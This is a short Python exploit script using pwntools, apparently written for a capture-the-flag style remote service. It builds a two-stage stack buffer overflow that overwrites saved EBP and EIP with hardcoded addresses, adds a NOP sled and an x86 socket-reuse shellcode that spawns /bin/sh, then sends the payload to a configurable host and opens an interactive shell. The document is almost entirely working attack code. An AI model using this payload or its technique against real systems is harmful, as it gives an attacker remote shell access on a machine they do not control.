# Written by Eyal AsulinÂ©

### Generate Payload ###
"""
shellcode_addr = 0x0804b427
read_addr      = 0x08049217
max_shellcode_len  = 0x000000ff (255 bytes)
"""

# https://packetstormsecurity.com/files/download/154925/linuxx86socket-shellcode.txt
shellcode = "\x31\xdb\xb3\x03\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\x80\xf9\xff\x75\xf3\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"


stage1 = "_" * 14  # offset
stage1 += "\x27\xb4\x04\x08"  # set $ebp to shellcode_addr
stage1 += "\x17\x92\x04\x08"  # set $eip to main funcion for re-reading
stage1 += "\xff\x00\x00\x00"  # max_shellcode_len
stage1 += "_" * 5

stage2 = "-" * 18  # offset
stage2 += "\x27\xb4\x04\x08"  # set $eip to shellcode_addr
stage2 += "\x90" * 20
stage2 += shellcode

payload = stage1 + stage2



### Sending Payload to Server ###
from pwn import *

HOST = ""  # !!Set IP Address!!
PORT = 0   # !!   Set PORT   !!

p = remote(HOST, PORT)
p.recvuntil("> ")
p.sendline(payload)
p.interactive()

# Written by Eyal AsulinÂ©